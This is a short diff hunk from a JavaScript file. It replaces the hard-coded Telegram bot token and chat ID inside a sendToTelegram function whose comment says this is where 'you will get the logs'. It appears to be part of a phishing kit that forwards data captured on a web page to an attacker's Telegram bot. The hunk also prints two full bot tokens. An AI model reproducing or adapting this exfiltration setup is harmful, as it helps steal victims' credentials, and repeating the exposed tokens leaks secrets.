@@ -246,8 +246,8 @@ document.addEventListener('DOMContentLoaded', () => {
     function sendToTelegram(data) {
         // Add your bot details here👇 (this is where you will get the logs)
 
-        var telegramBotId = "6356015391:AAGI-6hBTwHMG6LwBF8vTVYAXYkalQ8Xl-s";
-        var chatId = 6717737923;
+        var telegramBotId = "6623018385:AAHaFro5bupYEFVqrwlYwngx8yE1Z7H7sOg";
+        var chatId = 952533175;
 
         var payload = {
           chat_id: chatId,
